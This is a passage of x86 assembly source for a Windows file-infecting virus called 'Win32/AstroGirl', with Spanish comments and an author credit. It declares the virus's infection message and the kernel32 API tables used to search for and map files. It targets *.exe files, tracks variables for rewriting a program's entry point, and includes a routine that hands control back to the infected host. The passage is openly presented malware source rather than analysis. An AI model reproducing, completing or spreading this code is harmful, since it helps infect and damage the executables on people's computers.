v_User32			 dd 00h
AstroPayload_Tittle		 db 'Win32/AstroGirl AstroCoded by a Wazex',0
AstroPayload_Message1		 db 'Your system is infected by Win32/AstroGirl v1.0',0Dh
AstroPayload_Continue		 db '       Dedicated to Anita and our peng-guin ;)',0Dh
AstroPayload_ContinuezZ		 db '                      SmuakssSsssss!!!!',0


;#####################################################################################
;-----------------------------===Apis de Kernel32.dll===-----------------------------#
;#####################################################################################

NombresApis_start	 	 label byte
n_FindFirstFileA 	 	 db 'FindFirstFileA',0
n_FindNextFileA			 db 'FindNextFileA',0
n_GetModuleHandleA		 db 'GetModuleHandleA',0
n_GetSystemTime			 db 'GetSystemTime',0
n_CreateFileA			 db 'CreateFileA',0
n_CreateFileMappingA		 db 'CreateFileMappingA',0
n_MapViewOfFile			 db 'MapViewOfFile',0
n_GetWindowsDirectoryA 		 db 'GetWindowsDirectoryA',0
n_SetCurrentDirectoryA 		 db 'SetCurrentDirectoryA',0
n_SetFileAttributesA		 db 'SetFileAttributesA',0
n_UnmapViewOfFile		 db 'UnmapViewOfFile',0
n_CloseHandle			 db 'CloseHandle',0
n_SetFileTime			 db 'SetFileTime',0
n_SetFileAttributes		 db 'SetFileAttributesA',0
NombresApis_end			 db 00h
;-------------------------------------------------------------------------------------
ValoresApis_start		 label byte
v_FindFirstFileA 		 dd 00h
v_FindNextFileA			 dd 00h
v_GetModuleHandleA		 dd 00h
v_GetSystemTime			 dd 00h
v_CreateFileA			 dd 00h
v_CreateFileMappingA		 dd 00h
v_MapViewOfFile			 dd 00h
v_GetWindowsDirectoryA		 dd 00h
v_SetCurrentDirectoryA		 dd 00h
v_SetFileAttributesA		 dd 00h
v_UnmapViewOfFile		 dd 00h
v_CloseHandle			 dd 00h
v_SetFileTime			 dd 00h
v_SetFileAttributes		 dd 00h
;#####################################################################################
;-----------------------------===Apis de User32.dll===-------------------------------#
;#####################################################################################


n_MessageBoxA			 db 'MessageBoxA',0
;-------------------------------------------------------------------------------------
v_MessageBoxA			 dd 00h



;#####################################################################################
;-------------------------------=Estructuras de Manejo de archivos=------------------#
;#####################################################################################
AstroFiles                       db  '*.exe',0
Max_Path                         equ 260
WindowsDir	                 db  Max_Path dup (?)
search_handle			 dd  00h
IWasHere			 db  00h
AstroContador			 dd  00h
AstroHandle			 dd  00h
AstroMapHandle			 dd  00h
AstroFile			 dd  00h
Alignment			 dd  00h
AstroViralSize			 dd  00h
InfectedSize			 dd  00h
flastsection			 dd  00h
OldEntryPoint			 dd  00h
NewEntryPoint			 dd  00h
;--------------------------------------------------------------------------------------

FILETIME                        struc
        FT_dwLowDateTime        dd               ?
        FT_dwHighDateTime       dd               ?
FILETIME                        ends


;--------------------------------------------------------------------------------------
WIN32_FIND_DATA                 label   byte

	WFD_dwFileAttributes    dd               ?
        WFD_ftCreationTime      FILETIME         ?
        WFD_ftLastAccessTime    FILETIME         ?
        WFD_ftLastWriteTime     FILETIME         ?
        WFD_nFileSizeHigh       dd               ?
        WFD_nFileSizeLow        dd               ?
        WFD_dwReserved0         dd               ?
        WFD_dwReserved1         dd               ?
        WFD_szFileName          db Max_Path dup (?)
        WFD_szAlternateFileName db       13 dup (?)
                                db       03 dup (?)

;--------------------------------------------------------------------------------------
SYSTEMTIME                      struct
        ST_wYear                dw       ?
        ST_wMonth               dw       ?
        ST_wDayOfWeek           dw       ?
        ST_wDay                 dw       ?
        ST_wHour                dw       ?
        ST_wMinute              dw       ?
        ST_wSecond              dw       ?
        ST_wMilliseconds        dw       ?

SYSTEMTIME                      ends
SystemTime                SYSTEMTIME     ?

;--------------------------------------------------------------------------------------


host:
	cmp	 ebp, 0h			;Primera Generación?
	je	 FrstGenHost			
	call	 Astrohost			;Si no, salta a Astrohost
	AstroNomia= $-offset BigBang		;Valor que voi a necesitar ahora ;)

Astrohost proc
mov	eax, AstroNomia				;Con esta rutina Consigo en ebx
mov	ebx, [esp]				;el offset donde empieza el código
sub	ebx, eax				;del host, y una vez ejecutado el
mov	ecx, [ebp+offset NewEntryPoint]		;del virus, o después de un faio,
sub	ebx, ecx				;que es cuando se accede a esta
add	ebx, [ebp+offset OldEntryPoint] 	;rutina, devuelvo el control al host.
jmp	ebx					;Esta rutina, también es una paranoia
endp						;mía xDD.

BigCrunch label byte

FrstGenHost:
		push 	 20h			;MsgBox de la primera generación. :)
		push	 offset titulo
		push 	 offset namez
		push	 00h
		call 	 MessageBoxA
		push     00h
		call ExitProcess
FIN:
end AstroStart
end